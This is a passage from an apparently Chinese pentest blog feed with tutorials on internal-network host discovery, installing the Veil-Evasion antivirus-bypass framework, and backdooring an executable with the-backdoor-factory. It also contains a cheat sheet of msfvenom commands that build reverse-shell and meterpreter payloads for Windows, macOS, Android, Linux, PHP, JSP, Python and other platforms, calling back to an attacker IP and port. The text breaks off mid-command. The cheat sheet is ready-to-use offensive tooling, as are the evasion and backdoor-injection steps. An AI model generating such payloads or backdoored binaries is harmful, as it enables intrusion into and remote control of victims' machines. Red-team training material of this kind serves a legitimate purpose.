src="../do/media/c3c2dffb726780a766b4ef3cd573ced0.jpg" alt></p><h3 id="5、Powershell"><a href="#5、Powershell" class="headerlink" title="5、Powershell"></a>5、Powershell</h3><pre><code class="code">c:\tmp&gt;powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;</code></pre><p><img src="../do/media/97ef86dfca58678be449d5b8e5ed6aaf.jpg" alt>  </p><h3 id="6、arp-scannet"><a href="#6、arp-scannet" class="headerlink" title="6、arp scannet"></a>6、arp scannet</h3><p>项目地址：<br><a href="https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200.4/" target="_blank" rel="noopener">https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200.4/</a><br><img src="../do/media/727cc7e2717a361bf93d66bdb922b5d6.jpg" alt>  </p><h3 id="7、arp-scan（windows）"><a href="#7、arp-scan（windows）" class="headerlink" title="7、arp-scan（windows）"></a>7、arp-scan（windows）</h3><p>(推荐)速度与快捷<br><code>arp-scan.exe -t 192.168.1.1/24</code>  </p><p>项目地址：<br><a href="https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan" target="_blank" rel="noopener">https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan</a><br>（非官方）</p><p><img src="../do/media/92ce763215c297168c4514992758d91b.jpg" alt></p><h3 id="8、arp-ping-exe"><a href="#8、arp-ping-exe" class="headerlink" title="8、arp-ping.exe"></a>8、arp-ping.exe</h3><p>arp-ping.exe 192.168.1.100<br><img src="../do/media/302ee6c2b41a771ab5df7c337de15d8e.jpg" alt></p><h3 id="9、其他"><a href="#9、其他" class="headerlink" title="9、其他"></a>9、其他</h3><p>如cain的arp发现，一些开源py，pl脚本等，不一一介绍。</p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p>以上非内置文件网盘位置。<strong>后门自查</strong>。<br>链接：<a href="https://pan.baidu.com/s/1boYuraJ" target="_blank" rel="noopener">https://pan.baidu.com/s/1boYuraJ</a><br>密码：58wf</p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12、基于UDP发现内网存活主机</title>
      <link href="/article/12_%E5%9F%BA%E4%BA%8EUDP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
      <url>/article/12_%E5%9F%BA%E4%BA%8EUDP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<h1 id="基于-UDP-发现内网存活主机"><a href="#基于-UDP-发现内网存活主机" class="headerlink" title="基于 UDP 发现内网存活主机"></a>基于 UDP 发现内网存活主机</h1><h3 id="UDP简介："><a href="#UDP简介：" class="headerlink" title="UDP简介："></a>UDP简介：</h3><p>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p><h3 id="UDP显著特性："><a href="#UDP显著特性：" class="headerlink" title="UDP显著特性："></a>UDP显著特性：</h3><ol><li><p>UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。  </p></li><li><p>UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。</p></li><li><p>UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p></li><li><p>UDP 支持多播和广播。</p></li></ol><h3 id="1、nmap扫描"><a href="#1、nmap扫描" class="headerlink" title="1、nmap扫描"></a>1、nmap扫描</h3><pre><code class="code">root@John:~# nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500</code></pre><p>慢的令人发指<br><img src="../do/media/d72422cf94838311f188ab28855607d8.jpg" alt></p><h3 id="2、msf扫描"><a href="#2、msf扫描" class="headerlink" title="2、msf扫描"></a>2、msf扫描</h3><pre><code class="code">msf &gt; use auxiliary/scanner/discovery/udp_probe</code></pre><p><img src="../do/media/bc1606e0634d5b82b4067bad86f3344a.jpg" alt>  </p><pre><code class="code">msf &gt; use auxiliary/scanner/discovery/udp_sweep</code></pre><p><img src="../do/media/644ad38c39a0f2bf861b3c623106f48a.jpg" alt></p><h3 id="3、unicornscan扫描"><a href="#3、unicornscan扫描" class="headerlink" title="3、unicornscan扫描"></a>3、unicornscan扫描</h3><p>linux下使用推荐  </p><pre><code class="code">root@John:~# unicornscan -mU 192.168.1.100</code></pre><p><img src="../do/media/13b2da3f39b189f06cbef691c8a58b79.jpg" alt></p><h3 id="4、ScanLine扫描"><a href="#4、ScanLine扫描" class="headerlink" title="4、ScanLine扫描"></a>4、ScanLine扫描</h3><p>项目地址：<br><a href="https://www.mcafee.com/ca/downloads/free-tools/scanline.aspx" target="_blank" rel="noopener">https://www.mcafee.com/ca/downloads/free-tools/scanline.aspx</a><br>网盘地址：<br><a href="http://pan.baidu.com/s/1i4A1wLR" target="_blank" rel="noopener">http://pan.baidu.com/s/1i4A1wLR</a><br>密码：hvyx</p><p>McAfee出品，win下使用推荐。管理员执行。<br><img src="../do/media/d3fdd900da379ed4c465e58fb5db4b46.jpg" alt><br><img src="../do/media/08e8b1ff1f1a750224a3e98f3c7bb04e.jpg" alt>  </p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p>在线基于Nmap的udp扫描：<br><a href="https://pentest-tools.com/network-vulnerability-scanning/udp-port-scanner-online-nmap" target="_blank" rel="noopener">https://pentest-tools.com/network-vulnerability-scanning/udp-port-scanner-online-nmap</a></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11、工具介绍Veil-Evasion</title>
      <link href="/article/11_%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8DVeil-Evasion.html"/>
      <url>/article/11_%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8DVeil-Evasion.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具介绍-Veil-Evasion"><a href="#工具介绍-Veil-Evasion" class="headerlink" title="工具介绍 Veil-Evasion"></a>工具介绍 Veil-Evasion</h1><p>项目地址：<br><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a></p><h3 id="1、Veil-Evasion"><a href="#1、Veil-Evasion" class="headerlink" title="1、Veil-Evasion"></a>1、Veil-Evasion</h3><p>Veil-Evasion 是与 Metasploit 生成相兼容的 Payload 的一款辅助框架，并可以绕过大多数的杀软。</p><p>Veil-Evasion 并没有集成在kali，配置 sources.list，可直接 apt-get。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/Deskto#cat /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#东软大学</span><br><span class="line">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#重庆大学</span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">### 2、安装</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop# apt-get install veil-evasion</span><br></pre></td></tr></table></figure><p>由于在实验中本机已经安装，所以我们在虚拟机中使用 git 方式来下载和安装。（以便截图）<br>ps:本次 kali 下截图使用 scrot  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/Deskto# apt-get install scrot</span><br><span class="line">root@John:~/Deskto# scrot -s //即可</span><br><span class="line">root@John:~/Deskto# git clone https://github.com/Veil-Framework/Veil-Evasion.git</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](../do/media/9665385060c79f6175e74032ad2e5f5f.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Veil-Evasion# ./setup.sh</span><br><span class="line">//安装漫长</span><br><span class="line">```  </span><br><span class="line">![](../do/media/b1a88b6e639e83ba04dcb815f1be3035.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/65807c037d2e0d7f6330de1be8bf7801.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/a6dd85c8811146b386d748891dc40ee8.jpg)  </span><br><span class="line"></span><br><span class="line">### 3、测试  </span><br><span class="line"></span><br><span class="line">以 `c/meterpreter/rev_tcp` 为例：  </span><br><span class="line">![](../do/media/6d0b6469b0b5b2cfcee03a1d9544441a.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/10b9071c854c0a2eeea642cc6fd4023c.jpg)  </span><br><span class="line"></span><br><span class="line">ps:Veil-Evasion 不再更新，新版本项目地址：  </span><br><span class="line">https://github.com/Veil-Framework/Veil</span><br><span class="line"></span><br><span class="line">### 4、附录：</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">[*] 可支持生成payloads:  </span><br><span class="line">1) auxiliary/coldwar_wrapper  </span><br><span class="line">2) auxiliary/macro_converter  </span><br><span class="line">3) auxiliary/pyinstaller_wrapper  </span><br><span class="line">4) c/meterpreter/rev_http  </span><br><span class="line">5) c/meterpreter/rev_http_service  </span><br><span class="line">6) c/meterpreter/rev_tcp  </span><br><span class="line">7) c/meterpreter/rev_tcp_service  </span><br><span class="line">8) c/shellcode_inject/flatc  </span><br><span class="line">9) cs/meterpreter/rev_http  </span><br><span class="line">10) cs/meterpreter/rev_https  </span><br><span class="line">11) cs/meterpreter/rev_tcp  </span><br><span class="line">12) cs/shellcode_inject/base64_substitution  </span><br><span class="line">13) cs/shellcode_inject/virtual  </span><br><span class="line">14) go/meterpreter/rev_http  </span><br><span class="line">15) go/meterpreter/rev_https  </span><br><span class="line">16) go/meterpreter/rev_tcp  </span><br><span class="line">17) go/shellcode_inject/virtual  </span><br><span class="line">18) native/backdoor_factory  </span><br><span class="line">19) native/hyperion  </span><br><span class="line">20) native/pe_scrambler  </span><br><span class="line">21) perl/shellcode_inject/flat  </span><br><span class="line">22) powershell/meterpreter/rev_http  </span><br><span class="line">23) powershell/meterpreter/rev_https  </span><br><span class="line">24) powershell/meterpreter/rev_tcp  </span><br><span class="line">25) powershell/shellcode_inject/download_virtual  </span><br><span class="line">26) powershell/shellcode_inject/download_virtual_https  </span><br><span class="line">27) powershell/shellcode_inject/psexec_virtual  </span><br><span class="line">28) powershell/shellcode_inject/virtual  </span><br><span class="line">29) python/meterpreter/bind_tcp  </span><br><span class="line">30) python/meterpreter/rev_http  </span><br><span class="line">31) python/meterpreter/rev_http_contained  </span><br><span class="line">32) python/meterpreter/rev_https  </span><br><span class="line">33) python/meterpreter/rev_https_contained  </span><br><span class="line">34) python/meterpreter/rev_tcp  </span><br><span class="line">35) python/shellcode_inject/aes_encrypt  </span><br><span class="line">36) python/shellcode_inject/aes_encrypt_HTTPKEY_Request  </span><br><span class="line">37) python/shellcode_inject/arc_encrypt  </span><br><span class="line">38) python/shellcode_inject/base64_substitution  </span><br><span class="line">39) python/shellcode_inject/des_encrypt  </span><br><span class="line">40) python/shellcode_inject/download_inject  </span><br><span class="line">41) python/shellcode_inject/flat  </span><br><span class="line">42) python/shellcode_inject/letter_substitution  </span><br><span class="line">43) python/shellcode_inject/pidinject  </span><br><span class="line">44) python/shellcode_inject/stallion  </span><br><span class="line">45) ruby/meterpreter/rev_http  </span><br><span class="line">46) ruby/meterpreter/rev_http_contained  </span><br><span class="line">47) ruby/meterpreter/rev_https  </span><br><span class="line">48) ruby/meterpreter/rev_https_contained  </span><br><span class="line">49) ruby/meterpreter/rev_tcp  </span><br><span class="line">50) ruby/shellcode_inject/base64  </span><br><span class="line">51) ruby/shellcode_inject/flat</span><br></pre></td></tr></table></figure><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10、msfvenom常用生成payload命令</title>
      <link href="/article/10_msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4.html"/>
      <url>/article/10_msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4.html</url>
      
        <content type="html"><![CDATA[<h1 id="msfvenom-常用生成-Payload-命令"><a href="#msfvenom-常用生成-Payload-命令" class="headerlink" title="msfvenom 常用生成 Payload 命令"></a>msfvenom 常用生成 Payload 命令</h1><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b &apos;\x00\x0a\xff&apos; -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure><h3 id="mac"><a href="#mac" class="headerlink" title="mac:"></a>mac:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho</span><br></pre></td></tr></table></figure><h3 id="android"><a href="#android" class="headerlink" title="android:"></a>android:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//需要签名</span><br><span class="line">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</span><br></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell:"></a>powershell:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a>linux:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</span><br></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php:"></a>php:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx:"></a>aspx:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp:"></a>jsp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp</span><br></pre></td></tr></table></figure><h3 id="war"><a href="#war" class="headerlink" title="war:"></a>war:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war</span><br></pre></td></tr></table></figure><h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs:"></a>nodejs:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl:"></a>perl:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl</span><br></pre></td></tr></table></figure><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby:"></a>ruby:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb</span><br></pre></td></tr></table></figure><h3 id="lua"><a href="#lua" class="headerlink" title="lua:"></a>lua:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua</span><br></pre></td></tr></table></figure><h3 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode:"></a>windows shellcode:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure><h3 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode:"></a>linux shellcode:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure><h3 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode:"></a>mac shellcode:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure><h3 id="便捷化payload生成："><a href="#便捷化payload生成：" class="headerlink" title="便捷化payload生成："></a>便捷化payload生成：</h3><p>项目地址：<br><a href="https://github.com/Screetsec/TheFatRat" target="_blank" rel="noopener">https://github.com/Screetsec/TheFatRat</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/Desktop# git clone https://github.com/Screetsec/TheFatRat.git</span><br><span class="line">//设置时需要挂墙</span><br><span class="line">```  </span><br><span class="line">![](../do/media/492800d0d4d9ed8b762c3494bc845363.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/6eeb8e3d9370ca202dd0b45abe2e8756.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/a43ce02f6b76b5f01b8697c215bad11d.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/58459088b75ecdcc093e435a5a586638.jpg)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 附录：</span><br><span class="line"></span><br><span class="line">中文使用说明：</span><br><span class="line">```code</span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">-p, --payload &lt;payload&gt; 使用指定的payload</span><br><span class="line">--payload-options 列出该payload参数</span><br><span class="line">-l, --list [type] 列出所有的payloads</span><br><span class="line">-n, --nopsled &lt;length&gt; 为payload指定一个 nopsled 长度</span><br><span class="line">-f, --format &lt;format&gt; 指定payload生成格式</span><br><span class="line">--help-formats 查看所有支持格式</span><br><span class="line">-e, --encoder &lt;encoder&gt; 使用编码器</span><br><span class="line">-a, --arch &lt;arch&gt; 指定payload构架</span><br><span class="line">--platform &lt;platform&gt; 指定payload平台</span><br><span class="line">--help-platforms 显示支持的平台</span><br><span class="line">-s, --space &lt;length&gt; 设定payload攻击荷载的最大长度</span><br><span class="line">--encoder-space &lt;length&gt; The maximum size of the encoded payload</span><br><span class="line"></span><br><span class="line">(defaults to the -s value)</span><br><span class="line">-b, --bad-chars &lt;list&gt; 指定bad-chars 如: &apos;\x00\xff&apos;</span><br><span class="line">-i, --iterations &lt;count&gt; 指定编码次数</span><br><span class="line">-c, --add-code &lt;path&gt; 指定个win32 shellcode 文件</span><br><span class="line">-x, --template &lt;path&gt; 指定一个 executable 文件作为模板</span><br><span class="line">-k, --keep payload自动分离并注入到新的进程</span><br><span class="line">-o, --out &lt;path&gt; 存放生成的payload</span><br><span class="line">-v, --var-name &lt;name&gt; 指定自定义变量</span><br><span class="line">--smallest Generate the smallest possible payload</span><br><span class="line">-h, --help 显示帮助文件</span><br></pre></td></tr></table></figure><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>9、工具介绍-the-backdoor-factory</title>
      <link href="/article/9_%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-the-backdoor-factory.html"/>
      <url>/article/9_%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-the-backdoor-factory.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具介绍-the-backdoor-factory"><a href="#工具介绍-the-backdoor-factory" class="headerlink" title="工具介绍 the-backdoor-factory"></a>工具介绍 the-backdoor-factory</h1><p>项目地址：<br><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在程序执行的时候，jmp 到代码段，来触发 payload。</p><h3 id="以项目中的过磅系统为例："><a href="#以项目中的过磅系统为例：" class="headerlink" title="以项目中的过磅系统为例："></a>以项目中的过磅系统为例：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/Desktop# git clone https://github.com/secretsquirrel/the-backdoor-factory.git</span><br><span class="line">//安装the-backdoor-factory</span><br><span class="line">```  </span><br><span class="line">![](../do/media/baa5f2ef8bc4b8332d377e179c2897d1.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/the-backdoor-factory# ./backdoor.py -f ~/demo/guobang.exe -S</span><br><span class="line">//检测是否支持后门植入</span><br><span class="line">```  </span><br><span class="line">![](../do/media/65f5db4ee779eaacdff8a20bdfd35ea8.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/the-backdoor-factory# ./backdoor.py -f ~/demo/guobang.exe -c -l 150</span><br><span 